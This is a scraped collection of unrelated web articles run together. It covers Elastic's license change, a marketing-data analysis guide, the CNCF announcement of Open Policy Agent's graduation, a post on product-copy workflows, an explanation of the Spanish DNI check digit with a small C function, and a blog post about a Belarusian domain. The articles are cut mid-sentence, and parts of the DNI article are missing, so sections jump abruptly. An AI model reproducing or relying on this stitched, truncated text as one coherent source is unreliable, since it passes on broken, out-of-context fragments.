<p>Luckily, researchers can see how that neuronal activity happens inside living brains. Modern technology allows one to peek inside the brain, seeing what olfactory receptors activate in response to what odors. That requires brain surgery and genetic manipulation, so itâ€™s not possible to do in people, but mice and rats can help. Thatâ€™s where Rinbergâ€™s lab comes in. His team uses genetically modified mice whose olfactory neurons are tinted with fluorescent …</p></article></div>

It incorporates all of our learnings from our experience and others who have made similar changes (<a href="https://www.mongodb.com/blog/post/mongodb-now-released-under-the-server-side-public-license">MongoDB</a>, <a href="https://www.cockroachlabs.com/blog/oss-relicensing-cockroachdb/">CockroachDB</a>, <a href="https://redislabs.com/blog/redis-labs-modules-license-changes/">RedisLabs</a>, <a href="https://blog.timescale.com/blog/building-open-source-business-in-cloud-era-v2/">TimescaleDB</a>, <a href="https://www.graylog.org/post/graylog-v4-0-licensing-sspl">Graylog</a>, etc.). Hopefully we helped a little here. There are many companies out there facing a similar decision. I hope that over time, those of us with similar goals can coalesce around a smaller number of licenses and that ELv2 will be a catalyst for that.</p><p>In that spirit, we worked on ELv2 with <a href="https://heathermeeker.com/about-me/">Heather Meeker</a>, a lawyer who is well known for helping to draft many OSS licenses, including the Mozilla Public License 2.0, as well as helping a number of organizations build similar-in-spirit licenses like the <a href="https://www.confluent.io/confluent-community-license/">Confluent Community License</a>, <a href="https://www.mongodb.com/licensing/server-side-public-license/faq">SSPL</a>, and others. We are also reaching out to initiatives like the <a href="https://polyformproject.org/">Polyform Project</a> and <a href="https://faircode.io/">Fair-code</a> as additional efforts to raise awareness of this license and look for ways to promote its wider use.&nbsp;
</p></div><h2>SSPL remains an option for the source code
</h2><div><p>We added <a href="https://www.mongodb.com/licensing/server-side-public-license">SSPL</a>, which is a copyleft license created by <a href="https://www.mongodb.com/blog/post/mongodb-now-released-under-the-server-side-public-license">MongoDB</a>, as an option to minimize the effect this license change would have on our users. MongoDB is one of the most popular projects out there, used by millions of developers who are happy with SSPL. </p><p>Since we made this announcement, we had many of our users reach out and say that they are thankful we provided this option. Their organizations are already using MongoDB, and this made our license change a non-event for them.</p><p>The SSPL is a licensing option for the source code, as shown below:
</p></div><p><img src="https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/bltd65944c1b54a1e0b/6018987f29a02c49ba1f3e4a/chart-license-update-2021.jpg"></p><p>And to be clear, we are <a href="https://writing.kemitchell.com/2021/01/20/Righteous-Expedient-Wrong.html">still</a> not claiming that either SSPL or the Elastic License are OSI-approved licenses.
</p><h2>Still no impact to our cloud and on-premises customers&nbsp;
</h2><p>It is important to repeat: there is no impact to any of our Elastic Cloud or self-managed customers. Our customers already use the default distribution under the Elastic License, and their use is governed by the terms of their subscription agreement, which continues to grant them access to additional features, access to support, and other Elastic commitments (for example, IP infringement indemnification) as before.
</p><h2>The path forward
</h2><p>These changes, including making the Elastic License more permissive, are intended to help us focus on building great products and investing in our community. This means building more great features, many of which we will provide for free and which will be developed in the open. But our commitment goes beyond the code. These license changes let us focus on what matters: helping you find success with our products.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>I have spent over a decade working as a business analyst at some of the top digital marketing agencies in the world. This has allowed me to not only learn data science but also to observe how people in other specialties interact with data.</p><p>Here’s what I realized:</p></div><ul role="list"><li>Data is incredibly powerful. </li><li>Analyzing it can help you make better decisions.</li><li>But it may not always be obvious how to get actionable insights from it if you don’t have training in data science.</li></ul><p>That is why it’s so important to learn to read marketing data. And this short guide will help you do exactly that.<br></p><h3>Why You Need To Be Prepared To Play a Detective</h3><div><p>People often imagine data analysis like this: you look at the metrics on a dashboard, everything is immediately obvious. Company makes a lot of money. Of course, if that was the case, business analysts would have to find new careers because no one would need them.</p><p>The reality is that when you are dealing with big businesses, you often have to go through enterprise marketing data with a fine-tooth comb to figure out what is going. For example, let’s say that the management of an amusement park didn’t do maintenance on their equipment for a long time, which led to several attractions breaking down.</p><p>After that, only half of the attractions remained in operation, which resulted in massive queues and annoyed customers. However, despite this disaster, that month turned out to be the most profitable month in the amusement park’s history. What on Earth happened?</p></div><div><p>‍</p><p>Now, when you encounter a situation like that, you may be completely baffled at first. Managerial negligence that leads to broken down attractions and unhappy customers shouldn’t result in an increase in profit. But once you go through the data, you may realize that due to the queues people spent more time in the amusement park restaurants that have big profit margins, which was what led to the record monthly profit.</p><p>As you can see, business analysis is a bit like detective work, you have to piece the puzzle together from the available evidence (data). And you need to be prepared to do this detective work if you are serious about getting actionable insights from marketing data.</p></div><div><div role="listitem"><div><div><p><a href="https://improvado.io/resources/free-tableau-templates">Get templates for free!</a></p><div><div><p>Thank you! Your submission has been received!</p></div><div><p>Oops! Something went wrong while submitting the form.</p></div></div></div></div></div></div><p>‍</p><h3>3 Data Analysis Traps You Need To Avoid</h3><h3>Okay, so before we get into reading data, we need to discuss the three biggest pitfalls that you need to avoid.<br>‍<br><strong>#1 Presuppositions</strong></h3><div><p><strong>‍</strong><br>It’s only human to be biased. It’s impossible to approach data without any pre-existing beliefs. That’s why you need to be aware of those pre-existing beliefs and how they may influence your data analysis. For example, let’s say that you run an ad campaign.</p><p>Based on your previous experience, you know that this type of campaign usually produces exceptional results. After a month, the campaign delivers great results, so you declare it a success. Now, you pressuposed that this campaign would work well because similar campaigns worked well in the past, so it is tempting to say “I knew it!” and call it a day without looking at the data. </p><p>But that would be a mistake. The reality is that until you look at the data, you don’t know <em>why </em>this campaign worked. It may well have been a fluke caused by some unusual event. So forget that you “knew” that it would work. Analyze the data. Why was this campaign successful? Once you figure it out, you will be able to create even better ad campaigns in the future. </p><p>Always do your best to prevent your presuppositions from clouding your judgement:</p></div><ul role="list"><li>Ask yourself <em>“What do I believe to be true that may not necessarily be true and how that may influence my data analysis?”</em></li><li>Put this presupposition aside and analyze the data as if it was the only information that you had available to you</li><li>See what the data says. It may support your initial assumption, it may demolish it. Be prepared to let go of the presupposition you had if the data disagrees with it.</li></ul><div><p>Keep in mind that what you need to be the most wary of is this sense that you “just know” something without looking at the data because it’s “obvious”. You never “just know” and it’s never “obvious” so interpret this feeling of certainty as a sign that you need to be even more diligent with data analysis.</p><p>After all, data analysis is about, well, data, not gut feelings.</p></div><h3>#2 Simple Explanations</h3><div><p>Another temptation that you need to resist is simple explanations. Often when you are analyzing data you will immediately come up with a simple explanation that (seemingly) accounts for what happened. For example, metrics are never static, they are always in flux, so there’s always something going on with the data.</p><p>Often this ebb and flow of metrics is just random, but sometimes it’s a result of seasonality. However, seasonality is the simplest explanation, so it may be tempting to just go with it.</p><p>But if you just take the easy approach of explaining everything with seasonality, you risk missing out on valuable business insights.</p><p>So make sure to carefully go through all the data and check all other potential explanations before you declare that the simplest explanation is the answer.</p></div><h3>#3 P-Hacking</h3><div><p>You may have heard the term “p-hacking”. It’s a way to interpret data from a study to establish a statistically significant relationship between variables that are actually not related at all.</p><p>Here’s how Wired explains it in their article <em>“We Are All ‘P-Hacking’ Now”</em>:</p><p><em>“Suppose you’re testing a pill for high blood pressure, and you find that blood pressures did indeed drop among people who took the medicine. The p-value is the probability that you’d find blood pressure reductions at least as big as the ones you measured, even if the drug was a dud and didn’t work. A p-value of 0.05 means there’s only a 5 percent chance of that scenario. By convention, a p-value of less than 0.05 gives the researcher license to say that the drug produced “statistically significant” reductions in blood pressure.”</em></p><p><em>Journals generally prefer to publish statistically significant results, so scientists have incentives to select ways of parsing and analyzing their data that produce a p-value under 0.05. That’s p-hacking.”</em></p><p>It’s important to note that scientists usually don’t p-hack on purpose, they simply unintentionally interpret the data in a way that favors the hypothesis they are emotionally invested in.</p><p>And scientists are not the only ones guilty of this. </p></div><figure id="w-node-3344cc74a517-a0883ebd"><p><img src="https://assets-global.website-files.com/5a1eb87c9afe1000014a4c7d/5f7b811890c8e2c4f80ea814_image%20(1).png" loading="lazy" alt="Card from “Cards Against Humanity (https://cardsagainsthumanity.com/)” game"></p><figcaption><em>Card from “</em><a href="https://cardsagainsthumanity.com/"><em>Cards Against Humanity</em></a><em>” game</em></figcaption></figure><div><p>Wharton marketing professors Christopher Van den Bulte and Ron Berman together with an Opendoor data scientist Leonid Pekelis and Facebook research scientist Aisling Scott did a study on p-hacking in marketing. They analyzed over 2,100 A/B tests run with Optimizely software in 2014 from nearly 1,000 accounts. What did they find?</p><p>Apparently, marketers were routinely “p-hacking” their A/B tests without even realizing it. Here’s an example the researchers provided: </p><p>An experiment is supposed to run for 4-5 weeks. 57% of marketers look at initial results daily and stop the test when it reaches 90% statistical significance. Berman explained that many people wait until the first time the A/B test reaches the 90% threshold and then stop the test.</p><p>“<em>The reason it is a mistake is because if you waited a bit longer, you might go below 90%, and below 70% and fluctuate again because it is a random process.”</em></p><p>And here’s a bit that you may find surprising if you are not well-versed in statistics:<br><em>“While 70% might still sound high, that confidence level actually means there is no meaningful difference whether one uses webpage version A or B.”</em></p><p>Basically, the takeaway here is to let the experiment to run its course, even if you think that you already got the results. The reason p-hacking is so prevalent in business is presumably the same reason why it’s so prevalent in science: you are incentivized to do experiments that produce results.</p><p>But the reality is that most A/B tests don’t lead to any significant discoveries. You must accept that and be okay with it. Keep in mind that in business, p-hacking leads to mistakes, and mistakes in enterprise marketing can be very, very expensive. </p><p>That is why I suggest you to take time to learn more about A/B testing statistics as well as the general concept of p-hacking. <br>How To Read Enterprise Marketing Data</p><p>Now let’s get into reading the data.</p></div><ul role="list"><li>Always start with a clear goal in mind. Don’t just “look at the data”, analyze a particular metric</li><li>When you are analyzing a particular metric, break it down into its component metrics, then analyze them. For example, the “revenue” metric can be split into “number of clients”, “average order value”</li><li>Go through the data methodically. For example, if you’re analyzing revenue, first complete analysis of “number of clients” and only then go to the “average order value”. Jumping around increases the chances that you will miss something important.</li></ul><div><p>There may be cases when you can jump from one metric to another to test a hypothesis. For example let’s say that you are looking at the number of clients, and you see that it dropped.</p><p>You have a hypothesis that it happened due to the company changing its priorities toward big clients. So you may want to go to the average customer value metric, quickly check it to see if your hypothesis holds water, then go back to the number of clients.</p><p>That being said, it’s best to avoid jumping around as much as possible because, as I have already mentioned, it increases the odds of missing things.</p><p>You need to be methodical if you want to get the most out of the data that you have. You need to patiently go metric by metric, column by column, number by number. Sure, it’s not exactly glamorous, but it’s how business analysis is done. And it works.</p></div><h3>Conclusion</h3><div><p>We are fortunate to have so much marketing data at our fingertips. However, having that data is not enough, you also need to know how to read it. And you don’t have to become a data scientist to be able to benefit from the information that is available to you.</p><p>All you need to do is invest …</p></div></div></div></div>

<p><strong>SAN FRANCISCO, Calif. – February 4th, 2021 – </strong><a href="https://www.cncf.io/">The Cloud Native Computing Foundation</a>® (CNCF®), which builds sustainable ecosystems for cloud native software, today announced the graduation of Open Policy Agent (OPA). OPA has demonstrated widespread adoption, an open governance process, feature maturity, and a strong commitment to community, sustainability, and inclusivity to <a href="https://github.com/cncf/toc/blob/master/process/graduation_criteria.adoc">graduate</a>.</p>



<p><a href="https://www.openpolicyagent.org/">OPA</a> is an open source, general-purpose policy engine that enables unified, context-aware policy enforcement across the entire stack. The project was accepted into the CNCF sandbox in April 2018 and one year later was promoted to incubation. More than 90 individuals from approximately 30 organizations contribute to OPA, and maintainers come from four organizations, including Google, Microsoft, VMware, and Styra.&nbsp;</p>



<p>“As the cloud native ecosystem grows, it’s more important than ever for organizations to have access to policy enforcement tools built for modern cloud native deployments,” said Chris Aniszczyk, CTO of the Cloud Native Computing Foundation. “Since joining CNCF, OPA has expanded to integrate closer with Kubernetes via the Gatekeeper project but also supports a wide variety of use cases outside of Kubernetes.”</p>



<p>The project has been adopted widely in production by organizations like Goldman Sachs, Netflix, Pinterest, T-Mobile, and <a href="https://github.com/open-policy-agent/opa/blob/master/ADOPTERS.md">many others</a>. According to a <a href="https://blog.openpolicyagent.org/open-policy-agent-survey-summary-spring-2020-adaa46e61f0">recent OPA user survey</a> of more than 150 organizations, 91% indicated they use OPA in some stage of OPA adoption from QA to production. More than half indicated they use OPA for at least two use cases. The most common use cases for OPA are configuration authorization (such as Kubernetes admission control) and API authorization. The project has successfully integrated with several CNCF projects, including Kubernetes, Envoy, CoreDNS, Helm, SPIFFE/SPIRE, and more. It also integrates with Gatekeeper to provide a Kubernetes-native experience for admission policy enforcement and auditing.</p>



<p>“When we started OPA, we knew that policy and authorization were going to become more critical than ever, due to heterogeneous and complex app deployments,” said Torin Sandall, OPA co-founder and VP of Open Source at Styra. “We also knew we’d need the support of the community for integrations, performance, and knowledge-sharing. It’s thanks to this amazing group of folks that OPA today has become a graduated project and the de facto toolset and framework for expressing authorization policy across the stack.”</p>



<p>During its time in the CNCF incubator, OPA underwent two external security audits, the results of which can be found <a href="https://github.com/open-policy-agent/opa/blob/master/SECURITY_AUDIT.pdf">here </a>and <a href="https://github.com/open-policy-agent/gatekeeper/blob/master/SECURITY_AUDIT.pdf">here</a>, and OPA completed the SIG-Security <a href="https://github.com/cncf/sig-security/tree/master/assessments/projects/opa">assessment process</a>. The team has defined a <a href="https://github.com/open-policy-agent/opa/blob/master/SECURITY.md">security vulnerability disclosure process</a> and a security response team, which includes individuals from three current maintainer organizations.</p>



<p>“Thanks to OPA’s streamlined policy language, I can take policies that would otherwise require dozens of lines of code, and instead write them in just five or six lines. This means I was able to—literally overnight—take all of our existing policies and transition them to OPA,” said Joe Searcy, Member of Technical Staff, Distributed Systems at T-Mobile. “OPA policies are significantly faster to create, easier to maintain, and can be applied throughout our stack. We’ve reached the point that anytime, and with any new project, when we think about policy we automatically turn to Open Policy Agent.”</p>



<p>“Extensibility is really important to us, because we knew from the start that we’d be using OPA as part of a larger ecosystem, built into other code,” said Chris Stivers, Principle Engineer, PaaS, at Atlassian. “The community, the integrations, and the performance were what reassured us that OPA would meet our needs at Atlassian.”</p>



<p>To officially graduate from incubating status, the project was certified for <a href="https://bestpractices.coreinfrastructure.org/en/projects/1768">CII Best Practices Badge</a>, completed security audits and addressed vulnerabilities, defined its own <a href="https://github.com/open-policy-agent/opa/blob/master/GOVERNANCE.md">governance</a>, and adopted the <a href="https://github.com/open-policy-agent/opa/blob/master/CODE_OF_CONDUCT.md">CNCF Code of Conduct</a>.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>While building Ditto, we've gotten the chance to talk to 200+ teams about what the process of collaborating on copy looks like for them.</p><p>Our key finding? Copy is end-to-end — it exists from the early phases of discovery and design all the way to development.</p><p>This means that working on copy doesn't just involve writers drafting text on their own. It's the back-and-forth between designers and writers about how copy and visuals can work together. It's conversations with PMs to understand the goals of a new feature and what language will help users navigate successfully. It's working with legal to get a particular term approved for use, or talking to brand about how to name a new feature. It's getting copy translated and following up to fix phrases that are too long in another language. It's handing copy off to developers and making sure it gets into production error-free. It's developers sifting through hardcoded strings when copy already in production needs to get updated.</p><p>In other words, the process of getting copy written and in front of users relies on a <em>lot</em> of people.</p><p>On most teams, though, this process is still fragmented and unreliable. And though we're seeing companies realize how impactful copy is on user experience and business goals, most still have a long way to go in embedding copy into their product development workflows.</p><p>In almost all of our conversations, we heard the same challenges come up:</p><ol role="list"><li><strong>How do we integrate copy into the design process?</strong></li><li><strong>How do we manage stakeholder feedback and review of copy?</strong></li><li><strong>What's the best way to hand copy off to developers?</strong></li><li><strong>How do we establish lasting copy consistency across our product?</strong></li></ol><p>In this post, we're sharing what we've learned about the state of copy workflows from our conversations: the issues that teams are currently facing and strategies they've come up with for tackling them.</p><p>‍</p><div><p>1. Integrating copy into the design process</p>
</div><p>Copy is as much a part of the user experience as the layout and the visuals. But translating this into your product development process — making sure that copy and visual design evolve together — is tricky. Visuals often get prioritized over copy, and some words inevitably end up getting written last-minute, in a mad dash to replace lingering <em>lorem ipsums.</em></p><p>Part of the reason is that design and copy often don't share a toolset. Designers work in their design tools, but copy can exist in any number of places (think: external copy docs and spreadsheets, design tools, Jira, Slack, email). Between the annotated screenshots being messaged back-and-forth in Slack and copy tables in word documents, copy ends up increasingly detached from its goal of designing for users.<br>‍</p><p><strong>Strategies</strong></p><p>From our conversations, we've learned a few tips for fostering more effective copy-design collaboration:</p><ul role="list"><li><strong>Think about copy early on.</strong> Copy is an integral part of the user experience and should be part of the decision-making process from the start. This means thinking about copy even when the design problem is still being framed and user goals are still being established. Copy is more than just the words that eventually end up in the design. Understanding what content a user needs to feel reassured or successfully complete a task can inform the structure of a user flow or even highlight UI issues.<br>In practice, this can look like a few different things: Try designing with real content from the very beginning, and consider mapping out the flow and structure of copy <em>before</em> you start on the visuals. If your company has a dedicated content team, make sure they're kept in the loop on upcoming projects, whether that means inviting them to meetings or sending over post-kickoff notes.</li></ul><ul role="list"><li><strong>Take an overhead view on copy.</strong> As with visual design, successful copy requires thinking about the product as a whole. Consider how the text in one part of the product will interact with copy that already exists elsewhere. Think about how copy for a particular feature fits into the overarching journey of what else a user is reading and experiencing. See if you can reuse copy (more on this below!) to maintain consistency and overall usability across surfaces of the product.</li><li><strong>Make sure the mockups have up-to-date copy.</strong> This ensures that the text and visuals on a design are continuously aligned.</li></ul><p>For teams with dedicated content roles like UX writers and content designers:</p><ul role="list"><li><strong>Try using collaborative design tools (Figma, Adobe XD, etc.).</strong> Writers will be able to work side-by-side with designers, edit directly in the mockups, try out variations, and view changes in realtime. Just make sure to establish a clear process for how writers should work out of the design files. For example, if a mockup is particularly complex, this could mean creating a separate page in the file just for writers to play around with copy.</li><li><strong>Define a method for giving status updates</strong>. If writers are working directly out of the design file, it can be tricky to know what copy is final and what's not. Try indicating status in the file itself (ex: colored badges), or deciding on one communication tool like Slack.</li><li><strong>Determine what level of content work each project requires.</strong> While copy is important on every project, it'll be more important on some than others. Chances are, content designers will be supporting many teams at once, so prioritization is key. For writers, establish a process for receiving requests for copy help (we've heard Airtable or Google Forms work well!), and feel free to push back on "quick" requests when you don't have the bandwidth. Try building up a database of reusable text (more on this below) so designers can self-serve.</li></ul><p>‍</p><p>‍</p><div><p>2. Managing stakeholder feedback and review</p>
</div><p>Part of what makes collaborating on copy challenging is the number of stakeholders involved — almost every role at a company, from writers and designers to engineers, PMs, and legal, can touch the copy during any one project.</p><p>Compared to traditional content marketing workflows, product copy review is less linear and more iterative, relying on back-and-forth discussions more than explicit approvals. While compliance and brand teams may give one-and-done responses, folks like product owners and engineers are much more likely to give ongoing feedback as the design evolves.</p><p>Even more, every project involves different stakeholders who each have a set of tools they're comfortable with. For every team we talked to, copy review took place in some combination of the following places:</p><ul role="list"><li>Design tools (ex: Figma, Sketch, Adobe XD, Abstract)</li><li>Spreadsheets and documents (ex: Google Sheets, Google Docs, Airtable)</li><li>Communication tools (ex: Slack, email)</li><li>Project management tools (ex: Jira, Trello, Confluence)</li><li>Codebase + code management tools (ex: Github, Bitbucket)</li></ul><p>When some comments are added to Google Docs and others to an email thread, and the copy in mockups differs from that in the spreadsheet, stakeholders don't know where to find the most recent discussions or even version of copy. Tool overload makes it difficult to find alignment and make decisions, ultimately slowing the entire team down.</p><p>Beyond setting up a repeatable process for getting feedback, there are also challenges with getting the right feedback at the right time. Stakeholders (who usually aren't involved from the very beginning of the project) have to get up-to-speed on context — what this copy looks like in the design, where it sits in the UX flow, what the overarching project business and user goals are. Stakeholders also often have the mentality that "anyone can write," which can lead to unsolicited suggestions or unproductive feedback loops.</p><p><strong><br>Strategies</strong></p><p>Here are a few ways we've heard teams combat these issues:</p><ul role="list"><li><strong>Designate a single source of truth for all the copy in your project, and enforce that!</strong> Make sure it's kept up-to-date with the latest copy so everyone can stay on the same page. Limit all copy-related discussion to this source of truth, and make sure it's easily accessible by stakeholders. It should also allow you to easily track progress, record iterations, and document who's making changes and the rationale behind those decisions.</li><li><strong>Ensure stakeholders get the context they need off-the-bat.</strong> This could mean linking documentation in the request for review, hopping on a brief call to fill them in, or recording a video walkthrough of the flow. Whenever possible, present copy with visual context. It can also be helpful include what stage the copy is at (was it just drafted, or has it already been rewritten and reviewed by three other teams?) so you get the correct level of feedback.</li><li><strong>Build up relationships with stakeholders</strong>. Sync regularly with key stakeholders, and start to understand their challenges and definitions of success. Look for shared goals and opportunities to advocate for copy and its impact on business and user experience across different parts of the company. Whenever possible, measure copy ROI, tie those to business outcomes, and share those wins so stakeholders are more likely to give copy a seat at the table.</li></ul><p>👉 <em>At Ditto, we're helping teams </em><a href="http://bit.ly/ditto-workflow-single-source" target="_blank"><em>create a single source of truth</em></a><em> for all of their product copy.</em></p><p>‍</p><div><p>3. Handing copy off to developers</p>
</div><p>For all the work that goes into designing and reviewing copy, dealing with copy in production can be equally as challenging.</p><p>Several issues that came up repeatedly:</p><ul role="list"><li>developers don't know when copy is finalized, or even where to find the latest copy,</li><li>developers have to copy and paste text from the copy doc/mockup/other tool, which is time-consuming and error-prone,</li><li>if copy is hardcoded, even small copy changes require developers to hunt down strings down, which diverts them from more impactful work and makes it hard to rapidly change copy or do A/B tests,</li><li>copy often goes un-QA'd, resulting in costly post-production fixes,</li><li>localization involves a whole other set of people, tools, and processes that must also integrate with development.</li></ul><p>‍<br>‍<strong>Strategies</strong></p><p>Here are strategies we heard for getting copy into production more efficiently:</p><ul role="list"><li><strong>Establish a clear process for communicating when copy has been finalized.</strong> This was by …</li></ul></div></div>

the back of their <em>DNI</em> (the Spanish ID card):</p><pre><code>IDESPABC123456012345678Z&lt;&lt;&lt;&lt;&lt;&lt;

</code></pre><p>There is a myth that states that the last digit of the second line
represents the number of persons with the same name and last names as
the holder.  The purpose of this article is to demonstrate that this
is not true.</p><p>This zone of the <em>DNI</em> is composed of OCR characters, i.e., it is
prepared to be read by machines.  This digit in particular is just a
check digit used to verify the correct reading of the data.</p><p>Below, each of the OCR data zone fields will be identified and the check
digit calculation algorithm will be explained.</p><h2 id="fields">Identification of the fields</h2><p>The OCR data zone of the electronic <em>DNI</em> can be divided into several
fields:</p><pre><code>1.[ID] 2.[ESP] 3.[ABC123456] 4.[0] 5.[12345678Z] 6.[&lt;&lt;&lt;&lt;&lt;&lt;]

other fields.  First the characters must be separated, e.g., if the
field value is <code>12345678Z</code>:</p><pre><code>1 2 3 4 5 6 7 8 Z
</code></pre><p>If any of the characters is a letter, it must be replaced by its numeric
value:</p><pre><code>A 0   F 5   K 10   P 15   U 20   Z 25
B 1   G 6   L 11   Q 16   V 21
C 2   H 7   M 12   R 17   W 22
D 3   I 8   N 13   S 18   X 23
E 4   J 9   O 14   T 19   Y 24
</code></pre><p>So we have:</p><pre><code>1 2 3 4 5 6 7 8 25
</code></pre><p>The weight <code>7-3-1</code> must be applied to those numbers.  This means they
have to be multiplied by <code>7</code>, by <code>3</code> or by <code>1</code> depending on their
position:</p><pre><code>1  2  3  4  5  6  7  8  25
7  3  1  7  3  1  7  3   1
--------------------------
7  6  3 28 15  6 49 24  25
</code></pre><p>Then the results of the multiplications are summed:</p><pre><code>7 + 6 + 3 + 28 + 15 + 6 + 49 + 24 + 25 = 163
</code></pre><p>The check digit is the last digit of the sum, <code>3</code> in this case.</p><h3 id="implementation">Algorithm implementation</h3><p>This is an implementation of the algorithm in the C programming
language.</p><p>The <code>check_digit</code> function defined below receives a parameter of type
<code>char *</code> that must point to a string which contains digits and/or
letters.  It returns a <code>int</code> between <code>0</code> and <code>9</code>, the check digit of
the string.  If an invalid character is found, <code>-1</code> is returned.</p><pre><code>#include &lt;ctype.h&gt;

int
check_digit(char *s)
{
    static int m[3] = { 7, 3, 1 };
    int i, n;

    for (i = n = 0; s[i] != '\0'; i++)
        if (isdigit(s[i]))
            n += (s[i] - '0') * m[i % 3];
        else if (isalpha(s[i]))
            n += (toupper(s[i]) - 'A') * m[i % 3];
        else
            return -1;
    return n % 10;
}
</code></pre><h2 id="proof">Proof of concept</h2><p>If you have an electronic <em>DNI</em>, fill the fields below with the
hardware serial number of your <em>DNI</em>, your <em>DNI</em> number, your date of
birth and the expiration date of your <em>DNI</em> as they appear on the back
of your <em>DNI</em>.

the back of the <em>DNI</em> refers to the number of persons with the same name
and last names as you, explain them the truth!</p><h2 id="history">History</h2><p>In 2005, tired of hearing the myth of the <em>DNI</em> numbers, I decided to
search an answer to the enigma: if it’s not the number of persons with
your name and last names, what is it then?</p><p>Before knowing anything about the origin of the check digits or
knowing with certainty if they were, I already thought what they said
about that digit was unlikely.  It didn’t seem practical to include a
piece of information dependent on so many external factors to the card
holder, since it could easily turn obsolete and it would have no
value.  Ideally, if they really needed to know that information, they
could query a database.</p><p>I read about the possibility of them being check digits at a
<em><a href="http://www.microsiervos.com/archivo/leyendas-urbanas/numeros-dni.html">weblog</a></em> and it seemed reasonable to me.  The
digit after the birth date and after the expiration date seemed most
likely a function of the date, and my investigation was based on that.</p><p>Thanks to my friends, I collected some samples for comparing.  I tried
to apply several common check digit algorithms, but I had no luck.</p><p>One day I could compare two dates where the only difference was the
second digit.  Guessing that the algorithm worked with a weights
system (numbers that must be multiplied by the values depending on
their positions), a sum and the extraction of the last digit, I
deduced that the weight for the second position was a <code>3</code>.</p><p>I decided to address the problem with brute force, since it seemed
doable.  There were only 10 different values and 6 positions, so I
wrote a script that applied all permutations of weights while checking
the results for all the samples I had.  It worked and I got the
weights, <code>7-3-1</code>.</p><p>So I knew how to get the check digit for the dates, but there was a
problem to apply it to the digit next to the <em>DNI</em> number on the first
line.  This number had a letter, therefore I had to discover how to
get its numeric value.  After a few tests I found the answer: <code>A=0</code>,
<code>B=1</code>…  <code>Z=25</code>.</p><p>Only the last digit was left, the one that motivated me to begin this
research.  But its origin was not obvious because it was separated
from the other data.</p><p>I spent some time testing and with not exact result.  Finally, I read
a reference to certain document, ICAO <a href="https://www.icao.int/Security/mrtd/Pages/Document9303.aspx">9303</a> that
allegedly explained all this.  I couldn’t have access to that
document, since I couldn’t find it online at the time, but I found
<a href="http://www.highprogrammer.com/alan/numbers/mrp.html">documents</a> explaining the <code>7-3-1</code> weight system and
its application to passports, citing the 9303 document as its source.
But the OCR data on the passport has a different format than the OCR
data on the <em>DNI</em>, so I didn’t find the solution, but I got a clue:
the last check digit of the OCR data of a passport is calculated like
the other check digits explained in this document, but its origin is a
selection of the previous data; I read the sex and nationality didn’t
affect this check digit, and then I realized why I hadn’t found the
answer: in all the tests I had done, I always included the sex
character.  So after trying with just the check digits and its related
fields I managed to match all samples.</p><p>Six years later I still didn’t have an electronic <em>DNI</em>, but I could
analyze some kindly contributed samples.  Comparing an electronic
<em>DNI</em> with a traditional <em>DNI</em> I saw that the first line of the OCR
data had a different format; there was an addition before the <em>DNI</em>
number, that I identified as the serial number in the front of the
card, and its check digit; also, the <em>DNI</em> number didn’t have a check
digit.  Then I did a couple of tests and I found the new way to
calculate the check digit.</p></div></div>]]>

February 4, 2021 | https://nib.by/1 | <a href="https://web.archive.org/web/*/https://nib.by/1">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p><img src="https://nib.by/assets/label_belarussian_domain%20name.jpg" alt="It's easy to get confused with Google Translate from Cyrillic"></p>

<p><br>
Remember URL shorteners? They were important in the late 90s and early 2000s when non-voice mobile communication meant text messages to a <a href="https://amzn.to/2LgCTmD">Nokia brick</a>, and newspapers were struggling to find a way to put lengthy  web addresses onto the printed page without taking up too many column inches?</p>

<p>When we only had 160 characters to play with, every single one of them counted. If you were sending your friend a link to a cat Gif on Myspace, the friend would then need to laboriously type out that link on the yellowed  mechanical keyboard of the ageing 286 in the corner of the lounge.</p>

<p>It was a pain in arse, and when URL shorteners arrived on the scene in <a href="https://en.wikipedia.org/wiki/TinyURL"> 2002</a>, they were a godsend. A complicated, hierarchical, 300 character address could be compressed down to a dozen characters - or fewer.</p>

<p>Think of the repetitive strain injury. Think of the arthritis.</p>

<p>Those days are gone now, and <a href="https://thecrow.uk/">The Crow</a> rarely has the need for URL shorteners. There’s one built into Twitter of course, but I don’t use Twitter. Amazon has its own shortener, which, as far as I can tell is used to disguise affiliate links.</p>

<p>Various scandals related to tracking and privacy, and <a href="http://voices.washingtonpost.com/securityfix/2006/06/spam_spotted_using_tinyurl.html">spam</a> also put people off the idea of Short URLs. In very rare cases, I will need a short, easy to remember URL if I’m reading out an address over that most old fashioned of telecom devices -the phone.</p>

<p>Over the past few days, I’ve been noticing a few two letter domains appearing on the <a href="https://fediverse.party/"> Fediverse</a>, along with some smattering of conversation about URL shorteners. I wanted one, I needed one, and I had to have one.</p>

<p>To be fair, posts from <a href="https://social.thecrow.uk/"> The Crow’s very own Fediverse instance</a> have a 150,000 character limit, so <em>need</em> probably isn’t the right term. Regardless, I persuaded myself that there was a use case for one.</p>

<p>Believe it or not, there are loads of two character URLs out there which haven’t yet been snapped up by domain squatters. My first choice was <a href="http://2p.is/"> http://2p.is</a> (because it can be pronounced as ‘To piss’ and I have the toilet humour of a 12 year old), but between me spotting it on Monday night and waking up on Tuesday morning, it had been registered by someone else. The odds against this happening are absolutely astronomical, but whatever.</p>

<h2>What's this about Google Translate?</h2>

<p>Inspired by the 2p.is pun, i went in search of other domain hacks, and landed on .by - which is the <a href="https://en.wikipedia.org/wiki/.by"> latinised Belarussian TLD</a>.</p>

<p>Bear in mind that I’m not a Russian speaker. I can read the Cyrillic alphabet so long as the typeface isn’t too squiffy, but I figured that using Google translate in the Chromium browser would be a wise move.</p>

<p>The domain I was after wasn’t available, but the registrar offered me the same name with a .bel ending.</p>

<p>A.bel ending (snigger)? Why hadn’t I heard of this before?</p>

<p>Naturally, I started experimenting with domain hacks, came up with la.bel (Awesome name for a URL shortener) and with the help of a couple of people on the <a href="https://old.reddit.com/r/belarus"> r/Belarus subreddit</a>, managed, at 2am, to complete the form, pay the 33 rubles, and realise, some time later, that I had not purchased la.bel. Instead, I had paid out for ла.бел. Thanks Google.</p>

